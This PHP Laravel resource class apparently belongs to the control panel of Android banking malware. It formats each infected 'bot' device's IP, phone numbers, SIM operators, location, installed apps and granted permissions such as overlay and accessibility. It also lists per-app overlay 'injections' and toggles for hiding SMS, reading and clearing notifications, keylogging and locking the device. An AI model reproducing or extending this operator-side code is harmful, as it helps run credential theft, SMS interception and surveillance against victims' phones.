<?php

namespace App\Http\Resources\Bot;

use App\Dictionary\CountryDictionary;
use App\Http\Resources\BaseResource;
use App\Models\BotLog;
use App\Models\UserBotTimestamp;
use App\Services\LogsService\LogsService;
use Exception;
use Illuminate\Support\Collection;

class BotResource extends BaseResource
{
    public function toArray($request = null): array
    {
        $injects = [];

        /** @var Collection $logsApplication */
        $logsApplication = $this->logs->filter(function (BotLog $log) {
            return !empty($log->application);
        })->mapWithKeys(function (BotLog $log) {
            return [$log->application => $log->created_at?->format("Y-m-d H:i:s")];
        });

        /** @var Collection $userTimestampsApplications */
        $userTimestampsApplications = $this->userTimestamps->mapWithKeys(function (UserBotTimestamp $timestamp) {
            return [$timestamp->application => $timestamp->visited_at];
        });

        foreach ($this->botInjections as $botInject) {
            $count = false;
            $logsCurrentApplication = $logsApplication[$botInject->application] ?? null;

            if ($logsCurrentApplication) {
                $count = true;
                $userTimestampsCurrentApplication = $userTimestampsApplications[$botInject->application] ?? null;
                if ($userTimestampsCurrentApplication) {
                    $count = $logsCurrentApplication > $userTimestampsCurrentApplication;
                }
            }

            if ($botInject->injection) {
                $injects[] = [
                    "application" => $botInject->application,
                    "is_active" => $botInject->is_active,
                    "name" => $botInject->injection?->name,
                    "type" => $botInject->injection?->type,
                    "newData" => $count,
                ];
            }
        }

        try {
            $settings = [
                "hideSMS" => $this->settings["hideSMS"] === "1",
                "offSound" => $this->settings["offSound"] === "1",
                "readPush" => $this->settings["readPush"] === "1",
                "clearPush" => $this->settings["clearPush"] === "1",
                "keylogger" => $this->settings["keylogger"] === "1",
                "lockDevice" => $this->settings["lockDevice"] === "1",
                "arrayUrl" => $this->settings["arrayUrl"],
            ];
        } catch (Exception $e) {
            $settings = [];
        }

        $applications = BotLog::where("bot_id", $this->id)
            ->where("type", "applist")
            ->orderByDesc("created_at")
            ->first();

        if ($applications) {
            $log = LogsService::getArrayLog($applications->log);

            $applications = collect($log)->map(function ($application) {
                return $application["app"];
            });
        }

        $metadata = $this->metadata;

        if (isset($metadata["screenResolution"]) && !empty($metadata["screenResolution"]) && is_string($metadata["screenResolution"])) {
            $matches = [];
            preg_match("|(\d*),(\d*)|", $metadata["screenResolution"], $matches);

            if (!empty($matches[1]) && !empty($matches[2])) {
                $metadata["screenResolution"] = [];
                $metadata["screenResolution"]["width"] = $matches[1];
                $metadata["screenResolution"]["height"] = $matches[2];
            }
        } else {
            $metadata["screenResolution"] = [];
        }

        return [
            "id" => $this->id,
            "ip" => $this->ip,
            "last_connection" => $this->last_connection?->format("Y-m-d H:i:s"), // $this->last_connection,
            "country" => CountryDictionary::COUNTRIES[strtoupper($this->country_code)] ?? "Unknown",
            "country_code" => $this->country_code,
            "tag" => $this->tag,
            "update_settings" => $this->update_settings,
            "working_time" => $this->working_time,
            "sim_data" => [
                "operator" => $this->sim_data["operator"] ?? null,
                "isDualSim" => $this->compareStringBoolean("sim_data", "isDualSim"),
                "operator1" => $this->sim_data["operator1"] ?? null,
                "phone_number" => $this->sim_data["phone_number"] ?? null,
                "phone_number1" => $this->sim_data["phone_number1"] ?? null,
            ],
            "metadata" => $metadata,
            "permissions" => [
                "all_permission" => $this->compareStringBoolean("permissions", "all_permission"),
                "overlay_permission" => $this->compareStringBoolean("permissions", "overlay_permission"),
                "accounts_permission" => $this->compareStringBoolean("permissions", "accounts_permission"),
                "contacts_permission" => $this->compareStringBoolean("permissions", "contacts_permission"),
                "notification_permission" => $this->compareStringBoolean("permissions", "notification_permission"),
            ],
            "sub_info" => [
                "admin" => $this->compareStringBoolean("sub_info", "admin"),
                "screen" => $this->compareStringBoolean("sub_info", "screen"),
                "protect" => $this->compareStringBoolean("sub_info", "protect"),
                "isDozeMode" => $this->compareStringBoolean("sub_info", "isDozeMode"),
                "batteryLevel" => isset($this->sub_info["batteryLevel"]) ? (int)$this->sub_info["batteryLevel"] : null,
                "accessibility" => $this->compareStringBoolean("sub_info", "accessibility"),
                "isKeyguardLocked" => $this->compareStringBoolean("sub_info", "isKeyguardLocked"),
            ],
            "settings" => $settings,
            "is_favorite" => $this->is_favorite,
            "is_blacklisted" => $this->is_blacklisted,
            "created_at" => $this->created_at?->format("Y-m-d H:i:s"),
            "updated_at" => $this->last_connection?->format("Y-m-d H:i:s"),
            "injections" => $this->relationLoaded("botInjections") ? $injects : [],
            "comment" => $this->comment,
            "location" => empty($this->location) ? null : $this->location,
            "applications" => $applications,
        ];
    }
}
